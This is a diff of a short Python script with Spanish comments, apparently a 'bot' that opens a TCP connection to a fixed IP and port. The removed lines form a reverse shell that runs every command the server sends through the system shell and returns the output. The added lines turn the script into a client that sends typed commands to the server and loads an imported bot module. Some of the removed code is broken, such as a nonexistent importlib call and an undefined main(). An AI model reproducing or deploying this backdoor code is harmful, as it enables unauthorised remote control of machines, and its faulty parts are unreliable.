@@ -1,40 +1,52 @@
 import socket
 import subprocess
+import importlib
 
-def run():
+def run_bot():
     # Define la dirección IP y el puerto del servidor
     host = "172.16.22.190"
     port = 5555
 
-    # Crea un socket TCP/IP
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        # Crea un socket TCP/IP
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    # Conecta el socket al servidor
-    s.connect((host, port))
+        # Conecta el socket al servidor
+        s.connect((host, port))
 
-    # Importa el módulo bot
-    filename = "bot.py"
-    bot = importlib.import_lib(filename)
+        # Importa el módulo bot
+        filename = "bot"
+        bot = importlib.import_module(filename)
 
-    # Ejecuta el bot
-    bot.run()
-    
-    # Crea un bucle infinito para recibir y enviar datos
-    while True:
-        # Recibe datos del servidor
-        data = s.recv(1024)
+        # Ejecuta el bot
+        bot.run()
 
-        # Si no hay datos, la conexión se ha cerrado
-        if not data:
-            break
+        # Crea un bucle infinito para recibir y enviar datos
+        while True:
+            # Recibe datos del servidor
+            data = s.recv(1024)
 
-        # Imprime los datos recibidos
-        print(data.decode())
+            # Si no hay datos, la conexión se ha cerrado
+            if not data:
+                break
 
-        # Envia los datos de entrada al servidor
-        command = data.decode()
-        output = subprocess.run(command, shell=True, capture_output=True, text=True)
-        s.sendall(output.encode())
+            # Imprime los datos recibidos
+            print(data.decode())
+
+            # Envia los datos de entrada al servidor
+            command = input("Ingrese el comando a enviar al servidor: ")
+            s.sendall(command.encode())
+
+            # Recibe y muestra la salida del comando ejecutado en el servidor
+            output = s.recv(1024)
+            print(output.decode())
+
+    except ConnectionRefusedError:
+        print("Error: No se pudo establecer la conexión. Asegúrate de que el servidor esté en ejecución.")
+    finally:
+        # Cierra la conexión al salir del bucle
+        s.close()
 
 if __name__ == "__main__":
-    main()
+    run_bot()
+
